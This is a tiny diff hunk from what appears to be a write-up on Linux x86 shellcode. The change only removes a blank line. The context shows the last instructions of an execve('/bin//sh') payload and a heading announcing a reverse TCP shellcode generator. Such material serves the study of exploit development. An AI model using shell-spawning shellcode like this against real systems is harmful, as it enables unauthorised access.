@@ -281,7 +281,6 @@ _start:
 	mov ebx, esp           ; store address of TOS - /bin//sh
 	mov al, 0x0b           ; store Syscall number for execve() = 11 OR 0x0b in AL
 	int 0x80               ; Execute the system call
-
 ```
 
 ## A Reverse TCP shellcode generator
